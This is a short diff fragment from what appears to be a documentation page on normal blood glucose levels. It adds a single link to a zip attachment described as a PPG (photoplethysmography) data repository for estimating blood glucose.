@@ -54,6 +54,7 @@ Normal levels for people with and without diabetes are presented below:
 
 
 
+[PPG_photoplethysmography-data-repository-for-estimating-blood-glucose-levels.zip](https://github.com/user-attachments/files/19514793/PPG_photoplethysmography-data-repository-for-estimating-blood-glucose-levels.zip)
 
 
 
